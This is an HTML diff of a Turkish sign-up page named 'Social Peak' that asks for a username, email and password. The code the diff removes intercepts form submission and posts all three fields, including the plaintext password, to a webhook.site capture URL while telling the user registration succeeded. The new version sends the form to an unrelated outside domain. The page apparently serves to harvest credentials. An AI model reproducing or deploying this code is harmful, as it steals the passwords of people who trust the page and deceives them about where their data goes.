@@ -3,7 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Social Peak</title>
+  <title>Social Peak - Kayıt Ol</title>
+
+  <!-- CSS BAĞLANTI -->
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -20,7 +22,6 @@
       Sistemlerimize erişmek için aşağıdaki bilgileri doldurarak kayıt olun!
     </p>
 
-    <!-- 🔥 FORM BAĞLANDI -->
     <form action="https://www.vipechecker.art/register" method="POST">
 
       <label>Kullanıcı Adı</label>
@@ -32,64 +33,29 @@
       <label>Şifre</label>
       <div class="password-box">
         <input type="password" id="password" name="password" placeholder="Şifre" required>
-        <span onclick="togglePassword()"></span>
+        <span onclick="togglePassword()" title="Şifreyi Göster/Gizle"></span>
       </div>
 
-      <div class="checkbox">
-        <input type="checkbox" id="accept">
-        <label for="accept">
-          Kabul Ediyorum <span>Gizlilik Politikası ve Şartlar</span>
-        </label>
+      <button type="submit">Kayıt Ol</button>
+
+      <div class="login-text">
+        Zaten hesabın var mı? <a href="#">Giriş Yap</a>
       </div>
-
-      <button type="submit">KAYIT OL</button>
-
+      
     </form>
-
-    <p class="login-text">
-      Zaten hesabın varmı? <a href="#">Giriş Yap</a>
-    </p>
-
-    <div class="divider">
-      <span>Bizi Telegram kanalımızdan</span><br>
-      <span>Takip Edin</span>
-    </div>
-
-    <div class="social"><h4>SocialPeak0</h4></div>
-
   </div>
 </div>
 
 <script>
-document.querySelector("form").addEventListener("submit", function(e) {
-  e.preventDefault();
+function togglePassword() {
+  const passwordInput = document.getElementById('password');
 
-  const kabul = document.getElementById("accept").checked;
-  if (!kabul) {
-    alert("Şartları kabul etmelisin!");
-    return;
+  if (passwordInput.type === 'password') {
+    passwordInput.type = 'text';
+  } else {
+    passwordInput.type = 'password';
   }
-
-  const data = {
-    username: document.querySelector('input[name="username"]').value,
-    email: document.querySelector('input[name="email"]').value,
-    password: document.querySelector('input[name="password"]').value
-  };
-
-  fetch("https://webhook.site/3e76a8ca-d086-425d-86a8-476035d540e9", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify(data)
-  })
-  .then(() => {
-    alert("Kayıt başarılı!");
-  })
-  .catch(() => {
-    alert("Hata oluştu!");
-  });
-});
+}
 </script>
 
 </body>
